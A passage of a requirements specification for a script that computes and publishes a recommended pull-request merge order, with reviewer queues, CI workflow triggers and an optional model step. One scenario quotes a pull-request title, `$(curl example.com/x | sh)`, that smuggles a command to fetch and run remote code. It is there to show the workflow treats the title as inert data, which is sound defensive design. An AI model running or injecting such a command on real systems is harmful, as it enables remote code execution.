  mark; no item's block changes; the label `sequencer: check code`
  is removed; and the script makes no model call

### Requirement: The order says plainly what it did not check

The order's issue SHALL say `Build dependencies between changes' code were
not checked.` when some pair of changes exists and no model step has
checked any, and
name the unchecked pairs when it checked only some; it SHALL never present
an unchecked pair as checked. Where no open change exists, its only
statement about requirements SHALL be `Dependencies between requirements
were not checked: no open OpenSpec change.`, whether the CLI is missing,
too old or current.

#### Scenario: A partly checked order names the unchecked pairs

- **WHEN** #82, #90 and #95 hold open changes, and the model step checked
  only the pair #82 and #90
- **THEN** the order's issue names #82 and #95, and #90 and #95, as pairs
  whose code dependencies were not checked

#### Scenario: A repository without OpenSpec says requirements were not checked

- **WHEN** no open change exists in a repository whose pull requests
  change overlapping files
- **THEN** the order comes from explicit links and overlapping files, and
  its issue says `Dependencies between requirements were not checked: no
  open OpenSpec change.`

### Requirement: The same inputs give the same order whoever runs the script

Given the same repository state, the same record of checked pairs, the
same OpenSpec CLI version and the same minute of publishing, the script
SHALL produce byte-identical order text, whoever runs it, wherever, apart
from what follows from a read or edit its token could not make, or from a
fallback it applied because the order's issue named it; the order's issue
names each such difference.

#### Scenario: A session and CI agree

- **WHEN** an agent's session and the CI workflow run the script on the
  same repository state and record of checked pairs, with the same
  OpenSpec CLI version, in the same minute
- **THEN** both produce the same text for the order's issue and every block

### Requirement: A refused read with no fallback publishes nothing

Where GitHub refuses a read the order needs, and no requirement gives that
read a fallback, the script SHALL publish or print no order, and say which
read failed.

#### Scenario: A refused read with no fallback publishes nothing

- **WHEN** GitHub refuses the script's read of #96's changed files
- **THEN** the script edits nothing and says the read of #96's changed
  files failed

### Requirement: The whole order lives in one issue's body

The script SHALL keep the whole order in the body of the open issue
labelled `sequencer`, creating it when none is open and publishing nothing when more than one is. It SHALL
use that issue only when a writer opened it, or `github-actions[bot]`;
otherwise it SHALL publish nothing and name the issue, its author and why
its author is not a writer.
It SHALL NOT create the issue as an account other than a writer or
`github-actions[bot]`. Nothing of the order
SHALL go in a comment.

#### Scenario: The first publish creates the order's issue

- **WHEN** the script publishes in a repository with no open issue labelled
  `sequencer`
- **THEN** it opens one, labelled `sequencer`, whose body holds the order

#### Scenario: No order issue is created that would be refused

- **WHEN** no issue labelled `sequencer` is open, and the script runs as an
  App's bot account that it cannot tell is installed
- **THEN** it opens no issue, publishes nothing, and says why

#### Scenario: An order issue the workflow opened is used

- **WHEN** the one open issue labelled `sequencer` was opened by
  `github-actions[bot]`
- **THEN** the script publishes the order in it

#### Scenario: The order is never posted as a comment

- **WHEN** the script publishes an order
- **THEN** it posts no comment on any issue or pull request, and the order
  is in the order's issue body

#### Scenario: Two order issues stop the publish

- **WHEN** two open issues are labelled `sequencer`
- **THEN** the script edits nothing and names both issues

#### Scenario: An order issue opened without write access is refused

- **WHEN** the one open issue labelled `sequencer` was opened by an
  account without write access to the repository
- **THEN** the script reads no override from its comments and no stored
  code edge from its body, edits nothing, and names the issue and its author

### Requirement: Broken markers in the order's issue stop the run

Where the order's issue holds any marker line, but not exactly one begin
line followed by one end line, the script SHALL publish nothing and say so,
since that body holds what later runs read back.

#### Scenario: An order issue with broken markers stops the run

- **WHEN** a writer's edit leaves the order's issue with two
  `<!-- sequencer:begin -->` lines
- **THEN** the script edits nothing and says the order's issue's markers
  do not match

### Requirement: An order's issue with no markers gets them

Where the order's issue holds no marker line, as when someone, or Igor's
setup command `igor init`, adds the label `sequencer` to an issue a writer
opened, the script SHALL add its text, between
markers, at the end of the body, keeping the text already there.

#### Scenario: A labelled issue gets the order below its text

- **WHEN** a writer adds the label `sequencer` to their issue #120, whose
  body is `Sequencer order`, and no other issue holds the label
- **THEN** the script publishes the order in #120, between markers below
  `Sequencer order`

### Requirement: The script's text opens with a heading

The line after each `<!-- sequencer:begin -->` marker SHALL be a
first-level heading: `# Order` in the order's issue, and `# Sequencer` in
an item's block, so that the inquisitor spec's *Only four kinds of
document are decision documents*, which takes an issue's text before its
first heading as its decision block, never takes the script's text as one.

#### Scenario: The order is never read as a decision

- **WHEN** the script writes the order's issue body
- **THEN** the line after `<!-- sequencer:begin -->` is `# Order`

#### Scenario: A block in an issue with no heading is not read as a decision

- **WHEN** #43 enters the order, and its body is one paragraph with no
  heading
- **THEN** its new block's line after `<!-- sequencer:begin -->` is
  `# Sequencer`

### Requirement: Text from a pull request or the model is written inert

The script SHALL write each string taken from an issue, a pull request, a
change's files, the OpenSpec CLI or the model step, and each reviewer's
login, as inline code: delimited by a backtick run longer than any in it,
padded with a space where it starts or ends with a backtick, and with its
line breaks as spaces, so mentions, links and markers in it render inert.
The exceptions are an outside item's plain `<owner>/<repo>#<number>`
reference and the fenced record of checked pairs.

#### Scenario: A mention in a model's reason does not notify

- **WHEN** a model-step edge's reason is `calls claim() @maya see
  https://example.com`
- **THEN** the block shows that reason inside inline code, and GitHub
  notifies no one and renders no link

#### Scenario: Backticks and line breaks stay inside the code

- **WHEN** a reason is the letter x and a backtick, then a line break, then `@maya`
- **THEN** the block shows it as one code span, delimited by two backticks
  and holding the text x, a backtick, a space and @maya, and GitHub
  notifies no one

### Requirement: Each item's body carries a block giving its place

Each item SHALL carry, in its own body, one block
giving its place in the order, what it waits on with each reason, and a
link to the order's issue. The block SHALL NOT give the number of places,
because then an item joining or leaving would rewrite every block, not
only those after it.

#### Scenario: A pull request's block names its place and waits

- **WHEN** #90 is fifth in the order and waits on #82
- **THEN** #90's body holds a block saying it is fifth in the order, that
  it waits on #82 with the reason, and linking the order's issue

#### Scenario: An item joining at the end changes no other block

- **WHEN** #120 joins at the end of an order of twelve places
- **THEN** #120's body gains a block saying it is thirteenth in the order,
  and no other item's block changes

### Requirement: The script edits only the text between its markers

The order's issue body and each block SHALL lie between the lines
`<!-- sequencer:begin -->` and `<!-- sequencer:end -->`, and the script
SHALL change nothing in a body outside them. It SHALL add a new block
at the body's end, or, when the body's last line starts with `prose ✓`,
just before that line, so that the prose skill's signed footer stays
last.

#### Scenario: A person's text around a block is untouched

- **WHEN** #90's body holds a person's text before and after its block, and
  the order changes
- **THEN** only the text between the markers changes

#### Scenario: A new block goes above a prose footer

- **WHEN** #90 enters the order, and its body ends with the line
  `prose ✓ 3f2a91`
- **THEN** its new block sits just before that line, which stays the
  body's last line

#### Scenario: A new block goes at the end of a body with no prose footer

- **WHEN** #91 enters the order, and its body's last line is a person's text
- **THEN** its new block is added after that line, at the body's end

### Requirement: The script rereads a body just before writing it

The script SHALL read each body again just before writing it, and write
its block into that text, so that an edit made while the run computed
the order is kept.

#### Scenario: An edit made during a run is kept

- **WHEN** a person edits the text around #90's block while a run computes
  the order
- **THEN** #90's body keeps the person's edit

### Requirement: A block is rewritten only when its text changes

The script SHALL edit a body only when the text between its markers would
change, and that text SHALL hold no date or time but each cycle's
`since` time.

#### Scenario: An unchanged order edits nothing

- **WHEN** the daily run finds the same order and reasons as the last
  publish
- **THEN** the script makes no edit to any body

### Requirement: An item that leaves the order loses its block

When an item leaves the order, by closing, merging or ceasing to be linked,
the script SHALL remove its block, markers included, and leave the rest of
its body as it was. An item that left the order while the order's issue held the note that the
issue is full keeps its block for good, since the next publish finds
blocks to remove through the order it replaces, and the note names no item.

#### Scenario: A merged pull request's block is removed

- **WHEN** #82 merges
- **THEN** the next publish removes #82's block, and the order does not
  hold #82

### Requirement: A run that cannot edit the order's issue edits nothing

Where the script cannot edit the order's issue, it SHALL edit no item's
body either, so no block disagrees with an order's issue it could not
update, and SHALL say that the order's issue could not be edited.

#### Scenario: A read-only token publishes nothing

- **WHEN** a `pull_request_review` run for a fork's pull request gets a
  token that cannot edit the order's issue
- **THEN** the run edits no body, and says the order's issue could not be
  edited

### Requirement: An item the script cannot edit is named, not skipped silently

Where the script cannot edit an item's body, or the body's marker lines,
where it has any, are other than one begin line followed by one end line, the order's
issue SHALL name the item as having no block, saying why, and the script
SHALL leave the body as it is.

#### Scenario: A body the token cannot edit is reported

- **WHEN** editing #95's body fails with a permission error
- **THEN** the order still places #95, and the order's issue says #95 has no
  block because the edit was refused

#### Scenario: A body with an unmatched marker is left as it is

- **WHEN** #91's author deletes the line `<!-- sequencer:end -->` from
  #91's body
- **THEN** the script leaves #91's body as it is, and the order's issue
  says #91 has no block because its markers are unmatched

### Requirement: The order's issue names each reviewer's next review

The order's issue SHALL name, for each reviewer, the open pull request,
not authored by them, that they should review next: of
those awaiting their review, the one with the most other items after it,
directly or through a chain of edges, and on a tie the one earlier in the
order.

#### Scenario: The pull request that unblocks most is reviewed first

- **WHEN** a reviewer is asked to review #82, which four items come after,
  and #88, which one item comes after
- **THEN** the order's issue names #82 as that reviewer's next review

#### Scenario: A reviewer is never offered their own pull request

- **WHEN** `maya` authored #82, which the most items come after
- **THEN** #82 is not `maya`'s next review

#### Scenario: A tie goes to the pull request earlier in the order

- **WHEN** a reviewer awaits #82 and #88, which as many items come after,
  and #82 is earlier in the order
- **THEN** #82 is that reviewer's next review

#### Scenario: Items reached through others count

- **WHEN** #91 comes after #88, which comes after #82, and a reviewer
  awaits #82 and #84, #84 is earlier in the order, and only #86
  comes after #84, with nothing after #86
- **THEN** #82 counts two items after it, and is that reviewer's next
  review

#### Scenario: A draft is not offered for review

- **WHEN** #93 is a draft requesting review from a reviewer
- **THEN** #93 is not that reviewer's next review

### Requirement: A pull request awaits a reviewer until they review its current head

A pull request SHALL stop awaiting a reviewer once that reviewer submits
a review of any kind on its current head commit, as the review's
`commit_id` in GitHub's pull request reviews API shows. It SHALL stop
awaiting a team once any writer other than the pull request's author
submits such a review, because GitHub records reviews from users, never
from teams, and the script reads no team's members. When a push changes
its head, it SHALL await that reviewer or team again.

#### Scenario: A review of the current head takes a pull request off the queue

- **WHEN** `maya` submits a review of #97 whose `commit_id` is #97's head
  commit
- **THEN** #97 no longer awaits `maya`, and is not her next review

#### Scenario: A push after a review puts the pull request back on the queue

- **WHEN** `maya` reviewed #97 at its head commit, and a later push gives
  #97 a new head commit
- **THEN** #97 awaits `maya` again

#### Scenario: Any writer's review of the current head ends a team's wait

- **WHEN** CODEOWNERS gives the team `@octo/docs` #96's files, and `li`, a
  writer who is not #96's author, submits a review of #96's head commit
- **THEN** #96 no longer awaits `@octo/docs`, and is not its next review

#### Scenario: An installed App's review ends a team's wait

- **WHEN** CODEOWNERS gives the team `@octo/docs` #96's files, and the bot
  account of an App that the script's token can tell is installed submits
  a review of #96's head commit
- **THEN** #96 no longer awaits `@octo/docs`

### Requirement: Reviewers come from the repository's config, else from GitHub's requests, else CODEOWNERS

A non-draft pull request's reviewers SHALL be every login in the
`reviewers` list of `.github/sequencer.json` on the default branch, other
than its author's. With no such list, they SHALL include each reviewer whose
request on it is open or ended with their review, and no one it never
requested; when it has never requested a review, they SHALL be the owners
that the default branch's CODEOWNERS gives its changed files. It SHALL await each of its reviewers. A team SHALL count as one
reviewer.

#### Scenario: A team is one reviewer

- **WHEN** `.github/sequencer.json` does not exist, #96 requests no
  reviewer, and CODEOWNERS gives the team `@octo/docs` the files it changes
- **THEN** #96 awaits `@octo/docs` as one reviewer, which gets one next
  review

#### Scenario: A configured list makes each pull request await each reviewer

- **WHEN** `.github/sequencer.json` lists the reviewers `maya` and `li`,
  and `li` authored #97
- **THEN** #97 awaits `maya`'s review, and every other non-draft open pull
  request awaits both

#### Scenario: A requested reviewer who has reviewed stays a reviewer

- **WHEN** `.github/sequencer.json` does not exist, #98 requested `li`,
  `li` reviewed it, and a push then gave #98 a new head commit
- **THEN** #98 awaits `li` again, and CODEOWNERS is not consulted

### Requirement: Only a dry run takes a reviewer list

`order --reviewers <login>,...` SHALL use that list in place of the
configured reviewers, requested reviewers and CODEOWNERS, and `publish`
SHALL accept no reviewer list.

#### Scenario: A dry run's reviewer list publishes nothing

- **WHEN** a caller runs `order --reviewers maya`
- **THEN** it prints `maya`'s next review, and no body in the repository
  changes

#### Scenario: Publish refuses a reviewer list

- **WHEN** a caller runs `publish --reviewers maya`
- **THEN** the script exits non-zero, saying reviewers come from
  `.github/sequencer.json`, and edits nothing

### Requirement: The sequencer recommends a merge order and never merges

The script SHALL NOT merge, approve, close or reopen any pull request or
issue; the order it publishes SHALL be a recommendation.

#### Scenario: A pull request first in the order and approved stays open

- **WHEN** #82 is first in the order, approved and passing its checks
- **THEN** the script leaves it open and unmerged

### Requirement: The setup command writes the CI workflow and never overwrites it

`setup-ci` SHALL write the skill's workflow template to
`.github/workflows/sequencer.yml`, refuse when that file exists, and replace
it with the newer template when given `--force`.

#### Scenario: An existing workflow is kept

- **WHEN** `setup-ci` runs in a repository that already has
  `.github/workflows/sequencer.yml`
- **THEN** it leaves the file unchanged, exits non-zero, and says to pass
  `--force` to replace it

#### Scenario: --force replaces the workflow

- **WHEN** `setup-ci --force` runs where an older template exists
- **THEN** the file holds the current template

### Requirement: The workflow recomputes the order on GitHub events and once a day

The workflow SHALL run the script when an issue is opened, edited, closed,
reopened or commented on, a comment on a pull request included; when a
pull request is opened, edited, marked
ready for review, converted to draft, reviewed, given or relieved of a
review request, reopened, closed without merging, or merged; when a push reaches the default branch or an open
pull request's branch; when a Sequencer Igor dispatches it; and once a
day.

#### Scenario: Pull request events trigger through pull_request_target

- **WHEN** `setup-ci` writes the workflow
- **THEN** its pull request events other than reviews trigger through
  `pull_request_target`, reviews through `pull_request_review`, and none
  through `pull_request`

#### Scenario: A commit to the default branch starts a run

- **WHEN** a commit straight to the default branch adds `li` to the
  `reviewers` list in `.github/sequencer.json`
- **THEN** a run starts, and the order's issue names `li`'s next review

#### Scenario: A review request starts a run

- **WHEN** `.github/sequencer.json` lists no reviewers, so GitHub's
  requests decide them, `maya` requests
  `li`'s review on #97, which is not a draft, and `li` awaits no other
  pull request
- **THEN** a run starts, and the order's issue names #97 as `li`'s next
  review

### Requirement: The workflow's runs share one concurrency group

All the workflow's runs SHALL share one concurrency group, so no two of
them edit a body at once.

#### Scenario: Two quick merges run one after the other

- **WHEN** two pull requests merge a second apart
- **THEN** the second run starts only after the first has finished

### Requirement: The workflow's deterministic part needs no secret

The workflow SHALL compute and publish an order with no secret but the
token GitHub gives each run, whichever way the repository chose to run the
model step.

#### Scenario: A repository with no secrets gets an order

- **WHEN** a repository holding no secret, where no pair was ever checked,
  runs the workflow
- **THEN** it publishes the order, saying build dependencies between
  changes' code were not checked

### Requirement: The repository chooses how the model step runs

`setup-ci` SHALL write the workflow for one of three ways of running the
model step, which the repository chooses: not at all; through the API key
the repository holds as the secret `ANTHROPIC_API_KEY`; or by an Igor.

#### Scenario: The default runs no model step

- **WHEN** `setup-ci` runs with no choice given
- **THEN** the workflow it writes runs no model step

### Requirement: An API key's model step runs only on events that can change a pair

Where the repository chose its API key, the model step SHALL run only in
a run triggered by the daily schedule, or by a pull request a writer
opened being opened, reopened or pushed to, since each call is paid for with the
repository's key.

#### Scenario: A comment makes no API call

- **WHEN** a pair of changes is unchecked because the last call
  failed, and someone comments on an issue
- **THEN** the run that comment triggers makes no API call, and the pair
  stays unchecked

### Requirement: With an API key, the model step is one API call with no tools

Where the repository chose its API key, `publish --model api` SHALL run the
model step, only while some pair of changes is unchecked, as one
Messages API call that offers no tools, sending those changes' files and
taking from the reply only what it validates as an edges file. When that
fails, the pairs SHALL stay unchecked, as *The order says plainly what it
did not check* says.

#### Scenario: The model step's call offers no tools

- **WHEN** the workflow runs the model step with the repository's API key
- **THEN** the request the script sends holds no `tools` and no MCP server,
  and the script runs no command and makes no other request from the
  reply

#### Scenario: No unchecked pair makes no call

- **WHEN** a writer's push triggers a run, and every pair of changes is
  checked
- **THEN** the script makes no API call

#### Scenario: A reply that does not parse checks nothing

- **WHEN** no pair was ever checked, and the model's reply is prose rather
  than an edges file
- **THEN** the script takes no edge from it, and the order says build
  dependencies between changes' code were not checked

### Requirement: With an Igor, the workflow labels the order's issue for the model step

Where the repository chose an Igor, `publish`, as the workflow runs it,
SHALL keep the order's issue labelled `sequencer: check code` exactly while
the order it publishes leaves unchecked a pair of changes.

#### Scenario: An unchecked order is labelled for an Igor

- **WHEN** a repository that chose an Igor publishes an order in which #82
  and #90 are unchecked
- **THEN** the order's issue carries the label `sequencer: check code`

#### Scenario: Publishing the model step's edges removes the label

- **WHEN** a Sequencer Igor's dispatched run publishes model-step edges
  that check every pair of changes
- **THEN** the script removes the label `sequencer: check code`

### Requirement: The workflow publishes an edges file a dispatched run carries

The workflow SHALL accept a `workflow_dispatch` run whose input is an edges
file, and publish it with `publish --code-edges`.

#### Scenario: A dispatched edges file is published

- **WHEN** a `workflow_dispatch` run carries an edges file whose changes
  are unchanged, and no newer run in the concurrency group cancels it
  while it waits
- **THEN** the run publishes its edges

### Requirement: The workflow runs no code from a pull request

The workflow SHALL run only the script, from the shared-skills commit that
`setup-ci` writes into the workflow file, and the OpenSpec CLI at the
version that file pins, reading pull requests' files as
data, and SHALL NOT check out or run code from a pull request's head. It
SHALL hand event fields and dispatch inputs to the script only through
environment variables or files, never inside a command line.

#### Scenario: A fork's pull request cannot run code with the token

- **WHEN** a pull request from a fork changes `.github/workflows/` and adds
  a script
- **THEN** the run reads the pull request's change files as data and runs
  none of its code

#### Scenario: A pull request's title is never run

- **WHEN** a pull request's title is `$(curl example.com/x | sh)`
- **THEN** the run hands the title to the script as data and runs nothing
  from it

### Requirement: Data names an item by repository and number, and a change by repository and name

`order --json` SHALL name each item, and each change's pull request, by
its repository and its number together, so a later order spanning
repositories can reuse it, and an edges file SHALL name each
change by its repository and its name. Text the script publishes SHALL
write an item as `#<number>`. `publish` SHALL refuse an edges file that
names a change without its repository.

#### Scenario: order --json names an item by repository and number

- **WHEN** a caller runs `order --json` in the repository
  adamstallard/shared-skills, and the order holds #82
- **THEN** the output names that item by the repository
  `adamstallard/shared-skills` and the number 82

#### Scenario: An edges file naming a change without its repository is refused

- **WHEN** an edges file's edge names its two changes as `claim-retries`
  and `add-claims-table`, with no repository
- **THEN** `publish` publishes none of that file's edges, and says which
  edge it refused

### Requirement: The script prints the order for callers without editing anything

`order` SHALL print the order, each item's place, its edges with
reasons, the explicit links to outside items, the cycles, the
shared names for the model step, each open change's hash, and a change's
files only where a writer opened its pull request, as JSON with `--json`,
and SHALL write to no issue or pull request; `publish` SHALL be the only command that edits,
and SHALL edit bodies directly, in a session as in the workflow.

#### Scenario: A session publishes without the workflow

- **WHEN** a repository has no `.github/workflows/sequencer.yml`, and an
  agent runs `publish` in a session
- **THEN** the script edits the bodies directly, dispatching no workflow

#### Scenario: An Igor reads places without editing

- **WHEN** an Igor runs `order --json`
- **THEN** it gets each item's place, each change's hash and the files of
  changes whose pull requests writers opened, and no body, label or comment
  in the repository changes

#### Scenario: An outside author's change is printed without its files

- **WHEN** `zed`, without write access, opens #121, whose change adds a
  requirement
- **THEN** `order` prints the hash of #121's change, and none of its files
  or of the names its `tasks.md` holds
